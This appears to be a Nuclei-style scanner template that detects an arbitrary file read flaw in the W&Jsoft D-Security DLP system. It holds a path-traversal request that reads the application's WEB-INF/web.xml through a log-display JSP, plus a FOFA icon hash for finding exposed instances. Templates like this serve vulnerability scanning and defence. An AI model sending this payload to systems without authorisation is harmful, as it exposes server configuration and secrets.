id: d-security-dlp-fileread

info:
  name: D-Security DLP File Read
  author: qwtd
  severity: medium
  description: D-Security DLP File Read was detected.
  reference:
    - https://github.com/wy876/POC/blob/main/WNJsoft/W%26Jsoft-D-Security%E6%95%B0%E6%8D%AE%E4%BB%BF%E6%B3%84%E9%9C%B2%E7%B3%BB%E7%BB%9F(DLP)%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa: icon_hash="616947260"
  tags: D-Security

http:
  - method: GET
    path:
      - "{{BaseURL}}/DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml"


    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<display-name>"
          - "Opening log file is failed!"
        condition: or
      - type: status
        status:
          - 200